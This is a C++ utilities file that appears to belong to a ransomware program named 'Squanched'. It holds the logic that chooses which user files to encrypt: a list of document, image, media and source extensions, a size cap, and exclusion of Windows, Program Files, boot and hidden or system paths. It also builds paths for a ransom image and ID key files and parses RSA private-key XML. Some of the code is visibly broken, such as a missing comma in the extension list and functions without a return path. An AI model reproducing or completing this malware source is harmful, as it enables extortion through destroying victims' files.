#pragma warning(disable:4996)
#include "Utils.h"
#include <iostream>

#include <unordered_set>

string string_to_hex(const string& input)
{
	static const char* const lut = "0123456789ABCDEF";
	size_t len = input.length();

	std::string output;
	output.reserve(2 * len);
	for (size_t i = 0; i < len; ++i)
	{
		const unsigned char c = input[i];
		output.push_back(lut[c >> 4]);
		output.push_back(lut[c & 15]);
	}
	return output;
}

string find_extension(const string& path)
{
	for (int i = path.size() - 1; i > 0; --i) {
		if (path[i] == '.')
			return string(path.begin() + i + 1, path.end());
	}
	return string("");
}

bool do_encrypt(const string& path)
{
	static std::unordered_set<string> ext_whitelist = {
		"pdf", "odt", "docx", "pptx", "txt",
		"ppt", "doc", "xml", "csv", "java"
		"mov", "zip", "jpg", "jpeg", "xls",
		"doc", 	"ppt", "gif", "png", "xlsx",
		"cpp", "c", "sql", "wav", "php", 
		"mpeg", "jar", "asp", "mp4"
	};
	std::string ext = find_extension(path);
	std::transform(ext.begin(), ext.end(), ext.begin(), tolower);
	try
	{
		return (ext_whitelist.find(ext) != ext_whitelist.end()) && (file_size(path) < MAX_FILE_SIZE) && ! hasNonEncryptAttribute(path);
	}
	catch(...)
	{

	}

}

bool do_decrypt(const string& path)
{
	return "." + find_extension(path) == LOCKED_EXTENSION;
}

bool is_valid_folder(const string& path)
{
	static std::unordered_set<string> unvalid_folder = {
		"Windows", "Program Files", "boot", "Recycle.Bin"
	};
	for (auto folder : unvalid_folder)
	{
		if(path.find(folder) != string::npos)
		{
			return false;
		}
	}
	return !hasNonEncryptAttribute(path);
}






size_t getFileSize(const string path)
{
	std::ifstream plaintext;
	plaintext.open(path, std::ios::binary);
	if (!plaintext.is_open()) {
		return 0;
	}
	plaintext.seekg(0, std::ios::end);
	std::streampos plaintextLen = plaintext.tellg();
	plaintext.close();
	return plaintextLen;
}

string get_path_to_jpeg()
{
	return get_home() + R"(\squanched.jpg)";
}

string get_path_to_id() {
	return get_home() + R"(\SquanchedID.id)";
}

string get_path_to_ENC()
{
	return get_home() + R"(\SquanchedENC.id)";
}

string get_home() {
#ifdef _WIN32
	string path;

	char* drive = getenv("USERPROFILE");
	if (drive == NULL) {
		throw std::runtime_error("USERPROFILE environment variable not found");
	}
	else {
		path = drive;
	}

	return path;
#else
	struct passwd *pw;

	uid_t uid = geteuid();
	pw = getpwuid(uid);
	if (pw) {
		return string(pw->pw_dir);
#endif
}

void parsePublicKey(const string& str, string& mod, string& exp)
{
	unsigned first = str.find("<Modulus>");
	unsigned last = str.find(R"(</Modulus>)");
	first += 9; //Length of "<Modulus>"
	mod = str.substr(first, last - first);
	first = str.find("<Exponent>");
	first += 10; //Length of "<Exponent>"
	last = str.find(R"(</Exponent>)");
	exp = str.substr(first, last - first);
}

StringPrivateBlob parsePrivateKey(const string&  str)
{
	string mod, exp, P, Q, DP, DQ, InverseQ, D;
	unsigned first = str.find("<Modulus>");
	unsigned last = str.find(R"(</Modulus>)");
	first += 9; //Length of "<Modulus>"
	mod = str.substr(first, last - first);
	
	first = str.find("<Exponent>");
	first += 10; //Length of "<Exponent>"
	last = str.find(R"(</Exponent>)");
	exp = str.substr(first, last - first);
	
	first = str.find("</Exponent><P>");
	first += 14; //Length of "</Exponent><P>"
	last = str.find(R"(</P><Q>)");
	P = str.substr(first, last - first);
	
	first = str.find("</P><Q>");
	first += 7; //Length of "</P><Q>"
	last = str.find(R"(</Q><DP>)");
	Q = str.substr(first, last - first);
	
	first = str.find("</Q><DP>");
	first += 8; //Length of "</Q><DP>"
	last = str.find(R"(</DP><DQ>)");
	DP = str.substr(first, last - first);

	first = str.find("</DP><DQ>");
	first += 9; //Length of "</DQ><DP>"
	last = str.find(R"(</DQ><InverseQ>)");
	DQ = str.substr(first, last - first);

	first = str.find("</DQ><InverseQ>");
	first += 15; //Length of "</DQ><InverseQ>"
	last = str.find(R"(</InverseQ><D>)");
	InverseQ = str.substr(first, last - first);

	first = str.find("</InverseQ><D>");
	first += 14; //Length of "</InverseQ><D>"
	last = str.find(R"(</D></RSAKeyValue>)");
	D = str.substr(first, last - first);

	struct StringPrivateBlob blob = {mod, exp, P, Q, DP, DQ, InverseQ, D };
	return blob;
}

bool getLinkTarget(const char linkFileName[], char targetPath[], int size)
{
	char link[MAX_PATH];
	memset(link, 0, MAX_PATH);
	strncpy_s(link, linkFileName, size);
	IShellLinkA * pISL = nullptr;
	CoInitialize((LPVOID)pISL);
	HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&pISL);

	if (SUCCEEDED(hr))
	{
		IPersistFile *ppf;

		hr = pISL->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
		if (SUCCEEDED(hr))
		{
			WCHAR wsz[MAX_PATH];

			//Get a UNICODE wide string wsz from the Link path
			MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, link, -1, wsz, MAX_PATH);

			//Read the link into the persistent file
			hr = ppf->Load(wsz, 0);

			if (SUCCEEDED(hr))
			{
				//Read the target information from the link object
				//UNC paths are supported (SLGP_UNCPRIORITY)

				if (pISL->GetPath(targetPath, MAX_PATH, NULL, SLGP_UNCPRIORITY) == S_OK)
				{
					//fprintf(LogFile, "\n INFO: Symbolic Link : %s resolved to %s ", linkFileName, targetPath);
					return true;
				}
				else
					return false;
			}
			else
				return false;
		}
		else
			return false;
	}
	return false;
}

bool hasNonEncryptAttribute(string path)
{
	DWORD attributes = GetFileAttributes(path.c_str());
	return attributes & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

bool myCopyFiles(const string& inPath,size_t inStartPos,
					size_t inEndPos, const string& outPath,
					size_t outStartPos)
{
	bool status = false;
	std::ifstream inFile;
	std::ofstream outFile;
		char* restBuffer = nullptr;
	inFile.open(inPath, std::ios::binary);
	if (!inFile.is_open())
	{
		goto COPY_CLEANUP;
	}
	size_t block = BIG_FILE_BLOCK_SIZE;
	restBuffer = new char[block];
	if (!restBuffer)
	{
		goto COPY_CLEANUP;
	}
	inFile.seekg(inStartPos);
	
	outFile.open(outPath, std::ios::binary | std::fstream::app);
	if(!outFile.is_open())
	{
		goto COPY_CLEANUP;
	}
	outFile.seekp(outStartPos);
	size_t delta;
	for (size_t i = inStartPos; i < inEndPos; i += block) {
		delta = (i + block <= inEndPos) ? block : inEndPos - i;//don't overlap
		inFile.read(restBuffer, delta);
		outFile.write(restBuffer, delta);
	}
	status = true;
COPY_CLEANUP:
	if(inFile.is_open())
		inFile.close();
	if(outFile.is_open())
		outFile.close();
	if (restBuffer)
		delete[] restBuffer;
	return status;
	}
